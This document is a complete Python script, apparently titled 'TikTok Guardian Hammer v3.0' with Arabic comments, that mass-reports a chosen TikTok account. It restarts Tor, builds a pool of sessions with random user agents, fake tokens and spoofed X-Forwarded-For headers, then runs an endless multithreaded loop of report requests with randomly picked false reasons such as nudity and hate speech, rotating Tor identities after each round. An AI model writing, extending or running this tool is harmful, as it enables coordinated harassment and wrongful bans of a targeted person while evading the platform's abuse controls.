#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TikTok Guardian Hammer v3.0 - شاملة الإعداد والتشغيل
"""

import os
import subprocess
import time
import requests
import random
import hashlib
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from fake_useragent import UserAgent

# إعدادات أساسية
TOR_PASSWORD = "Guardian2025!"
TOR_DIR = os.path.expanduser("~/.tor")
TORRC_PATH = os.path.join(TOR_DIR, "torrc")

CONFIG = {
    "tor_socks": "socks5h://127.0.0.1:9050",
    "max_threads": min(300, os.cpu_count() * 25),
    "requests_per_identity": 30,
    "jitter_range": (0.05, 0.2),
    "user_agent_types": ['mobile', 'desktop'],
    "safety_checks": {
        "max_retries": 2,
        "ip_verify_urls": ["https://api.ipify.org", "https://icanhazip.com"]
    }
}

# تجهيز إعدادات Tor
def kill_old_tor():
    subprocess.run(["pkill", "-f", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

def generate_hashed_password(password: str) -> str:
    result = subprocess.run(
        ["tor", "--hash-password", password],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    return result.stdout.strip().split('\n')[-1]

def write_torrc(hashed_pass: str):
    os.makedirs(TOR_DIR, exist_ok=True)
    config = f"""
ControlPort 9051
HashedControlPassword {hashed_pass}
CookieAuthentication 1
SocksPort 9050
"""
    with open(TORRC_PATH, "w") as f:
        f.write(config.strip())

def start_tor():
    subprocess.Popen(["tor", "-f", TORRC_PATH])
    time.sleep(5)

# السكربت الرئيسي
class AttackVectorPool:
    def __init__(self, pool_size=100):
        self.pool = [self._create_session() for _ in range(pool_size)]
        self.lock = Lock()

    def _create_session(self):
        session = requests.Session()
        session.proxies = {'http': CONFIG["tor_socks"], 'https': CONFIG["tor_socks"]}
        session.headers.update(self._generate_headers())
        session.timeout = 5
        return session

    def get_session(self):
        with self.lock:
            return random.choice(self.pool)

    def _generate_headers(self):
        device_id = f"LX{random.randint(int(1e15), int(9e15))}"
        return {
            'User-Agent': UserAgent().random,
            'X-Tt-Token': self._generate_fake_token(),
            'X-SS-Stub': hashlib.md5(device_id.encode()).hexdigest(),
            'X-Client-Lang': random.choice(['ar-SA', 'en-US']),
            'X-Forwarded-For': '.'.join(str(random.randint(1, 255)) for _ in range(4))
        }

    def _generate_fake_token(self):
        chars = "abcdef0123456789"
        return ''.join(random.choice(chars) for _ in range(32))

class CyberLynxPro:
    def __init__(self):
        self.lock = Lock()
        self.session_pool = AttackVectorPool(pool_size=100)
        self.report_reasons = [
            "inappropriate", "harassment", "spam", "hate_speech",
            "dangerous_acts", "nudity", "violence", "false_info"
        ]

    def test_proxy(self, session):
        try:
            r = session.get(random.choice(CONFIG["safety_checks"]["ip_verify_urls"]), timeout=5)
            return r.status_code == 200
        except:
            return False

    def send_report(self, target):
        session = self.session_pool.get_session()
        if not self.test_proxy(session):
            print("[!] Proxy check failed. Skipping...")
            return

        reason = random.choice(self.report_reasons)
        jitter = random.uniform(*CONFIG["jitter_range"])
        time.sleep(jitter)

        try:
            response = session.post(
                f"https://www.tiktok.com/report?user={target}&reason={reason}",
                timeout=5
            )
            print(f"[+] Report sent: {target} | Reason: {reason} | Status: {response.status_code}")
        except Exception as e:
            print(f"[-] Failed to report {target}: {str(e)}")

    def renew_tor_identity(self):
        try:
            with socket.create_connection(("127.0.0.1", 9051)) as s:
                s.send(f'AUTHENTICATE "{TOR_PASSWORD}"\r\n'.encode())
                s.send(b'SIGNAL NEWNYM\r\n')
                s.send(b'QUIT\r\n')
        except Exception as e:
            print(f"[ERROR] Could not renew Tor identity: {e}")

    def orchestrate_attack(self, target):
        iteration = 0
        while True:
            print(f"[*] Starting attack round {iteration + 1} on {target}")
            with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
                futures = [executor.submit(self.send_report, target) for _ in range(CONFIG["requests_per_identity"])]
                for future in as_completed(futures):
                    if future.exception():
                        print("[ERROR]", future.exception())
            self.renew_tor_identity()
            iteration += 1
            time.sleep(5)

if __name__ == "__main__":
    # إعداد تور
    print("[*] Preparing environment...")
    kill_old_tor()
    hashed = generate_hashed_password(TOR_PASSWORD)
    write_torrc(hashed)
    start_tor()
    print("[+] Tor is up and running.")

    # تشغيل الهجوم
    if sys.platform != 'linux':
        sys.exit("[ERROR] Android/Termux environment required")

    target = input(" :ﻑﺪﻬﺘﺴﻤﻟﺍ ﺏﺎﺴﺤﻟﺍ ﻢﺳﺍ ﻞﺧﺩﺃ").strip()
    nexus = CyberLynxPro()
    try:
        nexus.orchestrate_attack(target)
    except KeyboardInterrupt:
        print("\n[SHUTDOWN] Operation terminated by user.")
